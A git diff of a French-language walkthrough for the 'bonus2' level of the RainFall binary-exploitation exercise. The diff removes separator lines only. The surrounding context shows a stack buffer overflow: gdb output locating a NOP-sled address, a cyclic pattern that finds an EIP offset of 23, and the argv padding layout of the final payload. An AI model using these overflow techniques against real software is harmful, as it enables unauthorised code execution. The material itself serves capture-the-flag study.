@@ -85,7 +85,6 @@ Maintenant que l'on sait, que l'adresse de retour est ecrasé, il nous suffit d'
 ```
 bonus2@RainFall:~$ export LANG="nl"
 ```
-----------------------------------------------------------------
 #### Shellcode
 ----------------------------------------------------------------
 ```
@@ -103,7 +102,6 @@ $1 = 0xbffff132 "\220\220\220\220\220\220\220\220\220"...
 ```
 0xbffff132 + 500 (pour atterir dans le nop sled) = 0xbffff326
 
-----------------------------------------------------------------
 #### Offset
 ----------------------------------------------------------------
 (gdb) run $(python -c 'print("A" * 40)') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab
@@ -127,7 +125,6 @@ eip            0x38614137       0x38614137
 
 38614137 -> 8aA7 -> 7Aa8 -> 23
 
-----------------------------------------------------------------
 ##### Final Payload
 ----------------------------------------------------------------
 (Argv[1] = [Padding de 40]) (Argv[2] = [Padding de 23] + [Adress du shellcode] + [Padding pour overflow])
